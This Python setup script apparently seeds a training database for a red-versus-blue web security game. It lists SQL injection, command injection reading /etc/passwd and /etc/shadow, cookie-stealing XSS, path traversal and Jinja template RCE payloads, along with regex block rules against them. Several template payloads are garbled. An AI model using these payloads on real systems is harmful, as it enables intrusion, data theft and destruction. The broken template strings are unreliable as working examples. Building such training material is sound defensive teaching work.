import sqlite3
import json

def setup_tool_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()

    c.execute('''
        CREATE TABLE IF NOT EXISTS red_payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            scenario TEXT NOT NULL,
            label TEXT NOT NULL,
            payload TEXT NOT NULL,
            tip TEXT NOT NULL
        )
    ''')

    c.execute('''
        CREATE TABLE IF NOT EXISTS blue_defenses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            scenario TEXT NOT NULL,
            label TEXT NOT NULL,
            rule TEXT NOT NULL,
            tip TEXT NOT NULL
        )
    ''')
    
    # Clear existing to prevent duplicates on rerun
    c.execute('DELETE FROM red_payloads')
    c.execute('DELETE FROM blue_defenses')

    # Existing seed data based on compete.js
    red_seed_data = [
        # sqli_login
        ('sqli_login', 'Basic Auth Bypass', "' OR 1=1 --", 'Closes the quote, adds always-true condition'),
        ('sqli_login', 'Username Bypass', "admin' --", 'Comments out the password check'),
        ('sqli_login', 'Union Select Dump', "' UNION SELECT null,null,null--", 'Attempts to read extra columns from DB'),
        ('sqli_login', 'Boolean Blind', "' OR 'x'='x", 'Blind injection using tautology'),
        ('sqli_login', 'Drop Table Payload', "'; DROP TABLE users--", 'Destructive payload (simulated)'),
        # cmd_ping
        ('cmd_ping', 'Semicolon Injection', "8.8.8.8; ls -la", 'Runs second command after ping'),
        ('cmd_ping', 'Pipe to Shell', "8.8.8.8 | cat /etc/passwd", 'Pipes ping output to cat'),
        ('cmd_ping', 'Background Process', "8.8.8.8 & whoami", 'Runs whoami in the background'),
        ('cmd_ping', 'Backtick Exec', "`id`", 'Backtick command substitution'),
        ('cmd_ping', 'Chained Commands', "127.0.0.1 && cat /etc/shadow", 'Double-amp chained execution'),
        # xss_search
        ('xss_search', 'Basic Script Tag', "<script>alert(1)</script>", 'Classic XSS alert box injection'),
        ('xss_search', 'Image onerror', "<img src=x onerror=alert(1)>", 'Triggers on broken image load'),
        ('xss_search', 'SVG Inject', "<svg onload=alert(document.cookie)>", 'SVG loads attacker JS and steals cookie'),
        ('xss_search', 'JavaScript URI', "javascript:alert(1)", 'Triggered via href= or src='),
        ('xss_search', 'DOM-based XSS', "<iframe src=javascript:alert(1)>", 'Embedded iframe with JS protocol'),
        # lfi_traversal
        ('lfi_traversal', 'Linux passwd file', "../../etc/passwd", 'Classic path traversal to /etc/passwd'),
        ('lfi_traversal', 'Deep traversal', "../../../../etc/shadow", 'More levels of traversal needed'),
        ('lfi_traversal', 'Windows System32', "..\\..\\Windows\\system.ini", 'Windows-style path traversal'),
        ('lfi_traversal', 'Null byte bypass', "../etc/passwd%00.pdf", 'Null byte terminates extension check'),
        ('lfi_traversal', 'PHP Wrapper', "php://filter/read=convert.base64-encode/resource=index.php", 'PHP stream wrapper to read source'),
        # ssti_jinja
        ('ssti_jinja', 'Expression Probe', "/*7*7*/", 'Should render as 49 if vulnerable'),
        ('ssti_jinja', 'Config Dump', "/*config*/", 'Dumps Flask config including secrets'),
        ('ssti_jinja', 'Python Code Exec', "/*\"\".__class__.__mro__*/", 'Inspects Python class hierarchy'),
        ('ssti_jinja', 'OS Command via Python', "/*set x=\"os\".popen(\"id\").read()*//*x*/", 'Runs shell command via Python'),
        ('ssti_jinja', 'RCE Full Chain', "/*request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()*/", 'Full RCE via Jinja2 globals'),
        
        # New benign placeholders for custom_ctf
        ('custom_ctf', 'Scanner Tool', 'BENIGN-SCANNER-01', 'Performs a passive vulnerability scan'),
        ('custom_ctf', 'Information Gathering', 'BENIGN-INFO-GATHER', 'Attempts to fingerprint the backend technology'),
        ('custom_ctf', 'Conceptual Exploit Payload A', 'MOCK-EXPLOIT-PAYLOAD-A', 'Demonstrates an exploit execution flow'),
    ]

    blue_seed_data = [
        # sqli_login
        ('sqli_login', '🛡 Block SQL Keywords', "(?i)(union|select|insert|drop|delete|update|or\s+1=1|'\s*--)", 'Regex blocks common SQLi patterns'),
        ('sqli_login', '🛡 Block Quote + Comment', "'.*--", 'Blocks payloads using quote+comment bypass'),
        ('sqli_login', '🛡 Parameterized Mode', "(?i)(UNION|SELECT|DROP|'|--)", 'Broad block of SQL special chars'),
        ('sqli_login', '🛡 Block OR Injection', "(?i)\\bOR\\b.*=", 'Targets OR 1=1 style bypasses'),
        # cmd_ping
        ('cmd_ping', '🛡 Block Shell Operators', "[;&|`]", 'Blocks ; & | ` chars used in injection'),
        ('cmd_ping', '🛡 Block cmd Keywords', "(?i)(cat|ls|whoami|id|passwd|shadow)", 'Blocks common recon commands'),
        ('cmd_ping', '🛡 Input Sanitization', "[^a-zA-Z0-9.\\-]", 'Only allow alphanumeric+dot+dash'),
        # xss_search
        ('xss_search', '🛡 Block Script Tags', "(?i)<script|<\/script", 'Blocks opening/closing script tags'),
        ('xss_search', '🛡 Block Event Handlers', "(?i)onerror|onload|onclick|onfocus", 'Blocks inline JS event attributes'),
        ('xss_search', '🛡 Block JS Protocol', "(?i)javascript:", 'Blocks javascript: URI scheme'),
        ('xss_search', '🛡 HTML Entity Encode', "[<>\"']", 'Blocks all HTML special characters'),
        # lfi_traversal
        ('lfi_traversal', '🛡 Block Path Traversal', "(\.\.\/|\.\.\\\.)", 'Blocks ../ and ..\\ sequences'),
        ('lfi_traversal', '🛡 Block Sensitive Paths', "(?i)(etc/passwd|etc/shadow|win.ini|system32)", 'Blocks known sensitive file paths'),
        ('lfi_traversal', '🛡 Block Null Byte', "%00", 'Blocks null byte injection'),
        ('lfi_traversal', '🛡 Block PHP Wrappers', "(?i)php://", 'Blocks PHP stream wrapper URIs'),
        # ssti_jinja
        ('ssti_jinja', '🛡 Block Template Delimiters', "\\{\\{|\\}\\}|\\/*|%\\}", 'Blocks /* */ /* */ template syntax'),
        ('ssti_jinja', '🛡 Block Python Builtins', "(?i)(__class__|__mro__|__import__|popen|subprocess)", 'Blocks Python introspection keywords'),
        ('ssti_jinja', '🛡 Block Config Access', "(?i)config|request\\.", 'Blocks Flask context variable access'),

        # New benign placeholders for custom_ctf
        ('custom_ctf', '🛡 IP Rate Limiting Rule', '(?i)RATE-LIMIT-ACTIVATED', 'Blocks excessive requests from a single IP'),
        ('custom_ctf', '🛡 Mock WAF Signature Alpha', '(?i)MOCK-EXPLOIT-PAYLOAD-A', 'Blocks the execution of Exploit Payload A'),
        ('custom_ctf', '🛡 Behavior Anomaly Detection', '(?i)BENIGN-SCANNER-01', 'Flags and blocks unexpected traffic patterns'),
    ]

    c.executemany("INSERT INTO red_payloads (scenario, label, payload, tip) VALUES (?, ?, ?, ?)", red_seed_data)
    c.executemany("INSERT INTO blue_defenses (scenario, label, rule, tip) VALUES (?, ?, ?, ?)", blue_seed_data)

    conn.commit()
    print(f"Database setup complete. Seeded {len(red_seed_data)} red payloads and {len(blue_seed_data)} blue defenses.")
    conn.close()

if __name__ == '__main__':
    setup_tool_db()
